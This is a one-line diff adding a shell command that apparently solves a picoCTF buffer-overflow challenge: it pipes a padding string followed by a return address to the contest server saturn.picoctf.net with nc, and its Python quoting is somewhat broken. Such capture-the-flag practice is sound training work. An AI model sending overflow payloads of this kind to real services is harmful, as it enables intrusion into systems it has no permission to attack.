@@ -1,0 +1,1 @@
+python -c "from pwn import *";print 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08'| nc saturn.picoctf.net 57671
